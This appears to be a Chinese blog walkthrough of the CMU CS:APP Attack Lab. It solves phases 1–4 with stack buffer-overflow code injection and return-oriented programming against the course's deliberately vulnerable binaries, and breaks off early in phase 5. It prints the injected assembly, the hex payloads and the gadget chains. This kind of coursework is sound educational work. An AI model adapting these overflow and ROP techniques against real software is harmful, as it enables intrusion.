---
title: 03 AttackLab
abbrlink: 7686
date: 2023-06-12 21:10:26
tags: [c,project,汇编]
categories: [course,csapp,lab]
---

# 资料

**README**：[http://csapp.cs.cmu.edu/3e/README-attacklab](http://csapp.cs.cmu.edu/3e/README-attacklab)

**说明**：[http://csapp.cs.cmu.edu/3e/attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

**代码地址**：[http://csapp.cs.cmu.edu/3e/target1.tar](http://csapp.cs.cmu.edu/3e/target1.tar)

# 基本知识

x86-64 架构的寄存器有一些使用习惯，比如：

- 用来传参数的寄存器：%rdi, %rsi, %rdx, %rcx, %r8, %r9
- 保存返回值的寄存器：%rax
- 被调用者保存状态：%rbx, %r12, %r13, %r14, %rbp, %rsp
- 调用者保存状态：%rdi, %rsi, %rdx, %rcx, %r8, %r9, %rax, %r10, %r11
- 栈指针：%rsp
- 指令指针：%rip

主要内容为 3.10.3 和 3.10.4。

# Lab 流程

## 代码文件

解压后产生文件如下：

```
.
├── cookie.txt #8位十六进制代码作为攻击的标识符
├── ctarget #易于受ROP攻击的可执行程序
├── farm.c #用来找寻 gadget 的源文件
├── hex2raw #生成攻击字符串
├── README.txt
└── rtarget # 易于受代码注入攻击的可执行程序
```

##  重点

攻击字符串的地址应为：
1. 函数 `touch1,touch2,touch3` 的地址
2. 注入代码的地址
3. 其中一个 `gradget` 的地址

## 目标程序

两个目标程序的基本用法：

```cpp
[lqb@ ~/Course/csapp/attack]$ ./ctarget -h
Usage: [-hq] ./ctarget -i <infile> 
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file
```

> 不需要连接服务器就在每次运行时加上 -q

`ctarget` 和 `rtarget` 都会用 `getbuf()` 从标准输入中{% label 读取字符串 orange%}存入长为 `BUFFER_SIZE` 的 char 数组中：

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

`Gets` 类似标准库的 `gets` ，它们都能判断它们的目的缓冲大小是否足以存放输入的字符串。

根据输入的字符串是否大于缓冲大小，程序会返回不同结果

```shell
[lqb@ ~/Course/csapp/attack]$ ./ctarget -q
Cookie: 0x59b997fa
Type string:abc
No exploit.  Getbuf returned 0x1
Normal return
```

```shell
[lqb@ ~/Course/csapp/attack]$ ./ctarget -q
Cookie: 0x59b997fa
Type string:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 
```

**注意：**
- 字符串不要包含 `\n` ，因为 `Gets` 以此为结束符。
- `hex2raw` 的输入遵循 little-endian 规则，每次输入两位 16 进制编码。例如 0 写成 `00`，0xdeadbeef 写成 `ef be ad de`。

## hex2raw

可执行程序 `hex2raw` 用于生成攻击字符串。它以一个十六进制格式的字符串作为输入参数，可以使用 c 风格注释。

```
48 c7 c1 f0 11 40 00 /* mov $0x40011f0,%rcx *
```

使用方法：

```shell
./hex2raw < phase1.txt > phase1r.txt
```

生成的攻击字符串再作为 `ctarget` 和 `rtarget` 的标准输入

```
./ctarget -i phase1r.txt
./ctarget phase1r.txt #或
```

## 使用 gcc 和 ojbdump 生成字节序列

编写好汇编代码后，存储到 `.s` 文件中。可以通过 gcc 将其转化为 `.o` 文件。再通过反汇编生成字节序列

```shell
gcc -c example.s
objdump -d example.o
```

##  任务

| Phase | Program | Level | Method | Function | Points |
| ----- | ------- | ----- | ------ | -------- | ------ |
| 1     | CTARGET | 1     | CI     | touch1   | 10     |
| 2     | CTARGET | 2     | CI     | touch2   | 25     |
| 3     | CTARGET | 2     | CI     | touch3   | 25     |
| 4     | RTARGET | 2     | ROP    | touch2   | 35     |
| 5     | RTARGET | 3     | ROP    | touch3   | 5      | 

CI: Code injection
ROP: Return-oriented programming

# phase 1

## 任务描述 ：

这一关不会注入新代码，而是要利用攻击字符串将程序重定向到现有的否个方法。

`ctarget` 中，`getbuf` 是由 `test` 调用的：

```c
void test()
{
	int var;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n",val);
}
```

我们要做的是在 `getbuf` 通过 `ret` 返回时，去执行函数 `touch1` 而不是返回到函数 `test()` 中：

```c
void touch1()
{
	vlevel = 1;
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

## 解法 ：

先反汇编一下：

```shell
objdump -d ctarget > ctarget.txt
```

在 `ctarget.txt` 中定位到 `getbuf` ：

```
 777 00000000004017a8 <getbuf>:
 778   4017a8:   48 83 ec 28             sub    $0x28,%rsp
 779   4017ac:   48 89 e7                mov    %rsp,%rdi
 780   4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
 781   4017b4:   b8 01 00 00 00          mov    $0x1,%eax
 782   4017b9:   48 83 c4 28             add    $0x28,%rsp
 783   4017bd:   c3                      retq
 784   4017be:   90                      nop
 785   4017bf:   90                      nop
```


- 函数 `test` 中的 `call` 指令将返回地址压栈
- `getbuf` 再分配 0x28 (40 字节) 的栈空间，再由 `Gets` 读取标准输入并写入栈空间
- 我们需要调整标准输入的长度和内容将栈中函数 `test` 的 `call` 指令压入的地址 (大地址方向）改写成 `touch1` 的地址

找到 `touch1`：

```
 787 00000000004017c0 <touch1>:
 788   4017c0:   48 83 ec 08             sub    $0x8,%rsp
 789   4017c4:   c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vl     evel>
 790   4017cb:   00 00 00
 791   4017ce:   bf c5 30 40 00          mov    $0x4030c5,%edi
 792   4017d3:   e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
 793   4017d8:   bf 01 00 00 00          mov    $0x1,%edi
 794   4017dd:   e8 ab 04 00 00          callq  401c8d <validate>
 795   4017e2:   bf 00 00 00 00          mov    $0x0,%edi
 796   4017e7:   e8 54 f6 ff ff          callq  400e40 <exit@plt>
```

- `touch1` 的地址为 0x004017c0
- 栈总共分配 40 字节，所以标准输入的前面应有 80 个 0。
- 同时**应改写**内容在栈的**高地址**方向，所以标准输入的内容的**末尾**应为 00 40 17 c0

注意小端法，将结果写在 `phase1.txt` 中：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```

将其转换为攻击字符串：

```shell
[lqb@ ~/Course/csapp/attack]$ ./hex2raw <phase1.txt > phase1r.txt
```

运行结果成功：

```shell
[lqb@ ~/Course/csapp/attack]$ ./ctarget -i phase1r.txt -q
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

# phase 2

## 任务描述 ：

这关需要注入一小段代码。

`ctarget` 中存在函数 `ctarget`：

```
void touch2(unsigned val):
{
	vlevel = 2;
	if (val == cookie){
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else{
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

和上一个 phase 一样，将返回地址改写成 `touch2` 的地址。并且，将 cookie 作为参数。

## 解法：

找到 `touch2` 的地址：

```
 798 00000000004017ec <touch2>:
 799   4017ec:   48 83 ec 08             sub    $0x8,%rsp
 800   4017f0:   89 fa                   mov    %edi,%edx
 801   4017f2:   c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vl     evel>
 802   4017f9:   00 00 00 
 803   4017fc:   3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <co     okie>
 804   401802:   75 20                   jne    401824 <touch2+0x38>
 805   401804:   be e8 30 40 00          mov    $0x4030e8,%esi
 806   401809:   bf 01 00 00 00          mov    $0x1,%edi
 807   40180e:   b8 00 00 00 00          mov    $0x0,%eax
 808   401813:   e8 d8 f5 ff ff          callq  400df0 <__printf_chk@plt>
 809   401818:   bf 02 00 00 00          mov    $0x2,%edi
 810   40181d:   e8 6b 04 00 00          callq  401c8d <validate>
 811   401822:   eb 1e                   jmp    401842 <touch2+0x56>
 812   401824:   be 10 31 40 00          mov    $0x403110,%esi
 813   401829:   bf 01 00 00 00          mov    $0x1,%edi
 814   40182e:   b8 00 00 00 00          mov    $0x0,%eax
 815   401833:   e8 b8 f5 ff ff          callq  400df0 <__printf_chk@plt>
 816   401838:   bf 02 00 00 00          mov    $0x2,%edi
 817   40183d:   e8 0d 05 00 00          callq  401d4f <fail>
 818   401842:   bf 00 00 00 00          mov    $0x0,%edi
 819   401847:   e8 f4 f5 ff ff          callq  400e40 <exit@plt>
```

要求将 cookie (0x59b997fa) 作为输入的参数 (%rdi)，因此就需要注入代码。

调用流程应为：`test` -> `getbuf` -> 注入代码的地址 -> `touch2` 

**注入代码内容：**

注入代码应做到：
1. 设置输入参数 
2. 调用 `touch2` 
3. 必须用 `ret` 返回 `touch2` 的地址而不使用 `jmp` `call` 

注入代码应为：

```
movq $0x59b997fa,%rdi
push $404017ec #touch3的地址
ret
```

将其保存在 `phase2.s` 中，然后编译变成机器码再转化成字节序：

```shell
[lqb@ ~/Course/csapp/attack]$ gcc -c phase2.s
[lqb@ ~/Course/csapp/attack]$ objdump -d phase2.o
phase2.o：     文件格式 elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq  
```

> 这里的字节序列已经是小端法表示的了

**注入代码地址：**

现在执行注入代码可以成功设置参数并调用 `touch2`，还需要确定注入代码的地址，让 `getbuf` 能 `ret` 到注入代码的位置。

注入代码是通过 `Gets` 保存在内存中的。那么为了得知注入代码的地址（也就是 `Gets` 的缓冲区地址），需要用 gdb 确定执行过程中寄存器的值。

1. `gdb ctarget` 
2. `b getbuf` 
3. `r` 
4. 运行到 `mov %rsp,%rdi` 后可以查看 `%rdi` 的内容为 0x5561dc78，即为缓冲区的地址。

**标准输入内容：**

那么现在就能确定标准输入的内容为：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 
```

将其转换为攻击字符串：

```
[lqb@ ~/Course/csapp/attack]$ ./hex2raw <phase1.txt >phase2r.txt
```

执行验证：

```
[lqb@ ~/Course/csapp/attack]$ ./ctarget -i phase2r.txt -q
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

# Phase 3

## 任务描述：

这关需要注入一小段代码，但会传入字符串作为参数。

有函数 `hexmatch` 和 `touch3`

```c
int hexmatch(unsigned val,char *sval)
{
	char cbuf[110];
	char *s = cbuf+random()%100;
	sprintf(s,"%.8x", val);
	return strncmp(sval,s,9) == 0;
}
void touch3(char *sval){  
    vlevel = 3;  
    if (hexmatch(cookie, sval)){  
        printf("Touch3!: You called touch3(\"%s\")\n", sval);  
        validate(3);  
    } else {  
        printf("Misfire: You called touch3(\"%s\")\n", sval);  
        fail(3);  
    }  
    exit(0);  
}
```

任务是在 `ctarget` 中执行 `touch3`

## 解法：

找到 `touch3` 的地址为 **0x004018fa**：

```
 872 00000000004018fa <touch3>:
 873   4018fa:   53                      push   %rbx
 874   4018fb:   48 89 fb                mov    %rdi,%rbx
 875   4018fe:   c7 05 d4 2b 20 00 03    movl   $0x3,0x202bd4(%rip)        # 6044d     c <vlevel>
 876   401905:   00 00 00 
 877   401908:   48 89 fe                mov    %rdi,%rsi
 878   40190b:   8b 3d d3 2b 20 00       mov    0x202bd3(%rip),%edi        # 6044e     4 <cookie>                                                                   
 879   401911:   e8 36 ff ff ff          callq  40184c <hexmatch>
 880   401916:   85 c0                   test   %eax,%eax
 881   401918:   74 23                   je     40193d <touch3+0x43>
 882   40191a:   48 89 da                mov    %rbx,%rdx
 883   40191d:   be 38 31 40 00          mov    $0x403138,%esi
 884   401922:   bf 01 00 00 00          mov    $0x1,%edi
 885   401927:   b8 00 00 00 00          mov    $0x0,%eax
 886   40192c:   e8 bf f4 ff ff          callq  400df0 <__printf_chk@plt>
 887   401931:   bf 03 00 00 00          mov    $0x3,%edi
 888   401936:   e8 52 03 00 00          callq  401c8d <validate>
 889   40193b:   eb 21                   jmp    40195e <touch3+0x64>
 890   40193d:   48 89 da                mov    %rbx,%rdx
 891   401940:   be 60 31 40 00          mov    $0x403160,%esi
 892   401945:   bf 01 00 00 00          mov    $0x1,%edi
 893   40194a:   b8 00 00 00 00          mov    $0x0,%eax
 894   40194f:   e8 9c f4 ff ff          callq  400df0 <__printf_chk@plt>
 895   401954:   bf 03 00 00 00          mov    $0x3,%edi
 896   401959:   e8 f1 03 00 00          callq  401d4f <fail>
 897   40195e:   bf 00 00 00 00          mov    $0x0,%edi
 898   401963:   e8 d8 f4 ff ff          callq  400e40 <exit@plt>
```

调用流程应为：`test` -> `getbuf` -> 注入代码的地址 -> `touch3` -> `hexmatch`

**字符串内容：**

Cookie 值为 **0x59b997fa**，`hexmatch` 和 `touch3` 意为字符串 `sval` 的内容应和 cookie 相匹配。字符串应为 59b997fa。

`man ascii` 查询 ascii 表，得到字符串对应的字节序列应为：

```
35 39 62 39 39 37 66 61
```

**注入代码内容：**

注入代码应做到：

1. 设置输入参数为字符串地址 
2. 调用 `touch3` 
3. 必须用 `ret` 返回 `touch3` 的地址而不使用 `jmp` `call` 

注入代码应为：

```
movq (字符串地址),%rdi 
push $0x4018fa #touch3的地址
ret
```

可见，phase 2 的注入代码和 phase 3 的注入代码除了输入参数和 `ret` 返回的地址不同，其他都一样。

**字符串地址：**

phase2 我们已经知道 0x5561dc78 是 40B 栈空间的首地址，我们可以在栈空间中先存储注入代码，再存储字符串地址。但还需要注意传入的参数是地址而不是数据，这意味着在调用 `touch3` 和 `hexmatch` 时可能会覆盖栈上存储字符串的那片区域，所以我们需要确定 `touch3` 和 `hexmatch` 会占用到哪些空间。

```gdb
(gdb) x/20xw 0x5561dc78
0x5561dc78:     0x90c7c748      0x685561dc      0x004018fa      0x000000c3
0x5561dc88:     0x39623935      0x61663739      0x00000000      0x00000000
0x5561dc98:     0x00000000      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
(gdb) x/20xw 0x5561dc78
0x5561dc78:     0x0f6a6500      0xef625ab4      0x5561dc90      0x00000000
0x5561dc88:     0x55685fe8      0x00000000      0x00000004      0x00000000
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
```

观察发现，地址 `0x5561dc9c` ~ `0x5561dcc8` 上的内容没有变化是安全的。那么不妨将字符串放在地址 `0x5561dca8`

那么注入代码为：

```
movq 0x5561dca8,%rdi 
push $0x4018fa #touch3的地址
ret
```

将其保存在 `phase3.s` 中，然后编译变成机器码再转化成字节序：

```shell
[lqb@ ~/Course/csapp/attack]$ gcc -c phase3.s 
[lqb@ ~/Course/csapp/attack]$ objdump -d phase3.o
phase3.o：     文件格式 elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

**标准输入内容：**

标准输入的内容应为注入代码、字符串、末尾添加注入代码地址

```
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

> 从上到下依次为注入代码、touch3 地址、字符串

将其转化为攻击字符串：

```shell
[lqb@ ~/Course/csapp/attack]$ ./hex2raw <phase3.txt >phase3r.txt
```

验证结果：

```shell
[lqb@ ~/Course/csapp/attack]$ ./ctarget -q -i phase3r.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

# Rtarget 和 ROP

使用注入代码的方式攻击 rtarget 更加困难，因为它使用了两种技术：

1. 栈随机化：每次运行时栈的地址不同
2. 限制可执行代码区域：无法执行在栈空间上存储的代码

![Pasted image 20230625151402.png](https://s2.loli.net/2023/06/25/tR6Jp358WvQnsoN.png)

作为代替，可以使用 ROP 。该策略是找到**现有的**末尾为 `ret` 指令的若干代码片段 (这样的代码片段称为 *gadget* )。可以设计一个 gadget 序列，每个 gadget `ret` 到下一个 gadget，实现我们想要的操作。

例如，在 rtarget 中有函数：

```c
void setval_210(unsigned *p){
    *p = 3347663060U;
}
```

对应汇编代码为：

```
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3                retq
```

`d4 48 89 c7` 只是一个数字，但 `48 89 c7` 是指令 `movq %rax %rdi` 的编码。该函数以 `0x400f15` 为起始地址，但如果从 `0x400f18` 开始就变成了

```
400f18: 48 89 c7          movq %rax %rdi
400f1b: c3                retq
```

不同指令搭配不同寄存器的编码如下：

![Pasted image 20230625161141.png](https://s2.loli.net/2023/06/25/pN2c9nCUk8LXsdK.png)


在 `rtarget` 中，还包含着许多于此相似的函数，在本次实验中以函数 `start_farm` 开始，以 `end_farm` 结束，不要使用在范围外的函数作为 gadget 。
# Phase 4

## 任务描述：

对 `rtarget` 重复和 phase 2 相同的攻击。

只使用指令 `movq` `popq` `ret` `nop` 和寄存器 %rax~%rdi

## 解法：

先获得 `rtarget` 的反汇编代码：

```shell
[lqb@ ~/Course/csapp/attack]$ objdump -d rtarget >rtarget.txt
```

和 phase2 相同，我们需要做到：

1. 将 cookie 保存到 %rdi
2. ret `touch2` 的地址

**cookie 保存到%rdi 中:**

可以先将 cookie 保存在栈中，然后再保存到 %rdi 中。

查表发现，movq 指令都是以 `48 89` 开头，在 `rtarget` 的反汇编代码中检索。可以检索到：

```
00000000004019a0 <addval_273>:
4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
4019a6:   c3                      retq
```

如果以 **0x4019a2** 为首地址就变成：

```
4019a2:   48 89 c7                mov %rax,%rdi
4019a5:   c3                      retq
4019a6:   c3                      retq
```

作为 **gadget2**，可以将数据从 %rax mov 到 %rdi。现在还需要先把 cookie 从栈弹出到 %rax 中，检索 `58`

```
00000000004019a7 <addval_219>:
4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
4019ad:   c3                      retq
```

如果以 **0x4019ab** 为首地址就变成：

```
4019ab:   58                      popq %rax
4019ac:   90                      nop
4019ad:   c3                      retq
```

作为 **gadget1**

执行 0x4019ab->0x4019a2 就能实现想要的功能

**标准输入结果**

与栈相关的过程为：

1. `getbuf` 分配栈空间
2. `ret` gadget 1
3. `popq` cookie
4. `ret` gadget 2
5. `ret` `touch2`

那么标准输入的内容就是：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40B stack */
ab 19 40 00 00 00 00 00 /* gadget1 addr */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* gadget2 addr */
ec 17 40 00 00 00 00 00 /* touch2 addr */
```

将其转化为攻击字符串：

```shell
[lqb@ ~/Course/csapp/attack]$ ./hex2raw <phase4.txt >phase4r.txt
```

验证结果：

```shell
[lqb@ ~/Course/csapp/attack]$ ./rtarget -q -i phase4r.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

# Phase 5

## 任务描述：

和 phase3 一样，都是将 cookie 以字符串形式保存在栈中，然后将其地址作为参数调用 `touch3`。

## 解法：

cookie 的字符串表示为：

```
35 39 62 39 39 37 66 61
```

根据 phase3 的分析，栈地址为 **0x5561dc78**，**0x5561dca8** 后的栈地址不会被 `hexmatch` 覆盖。

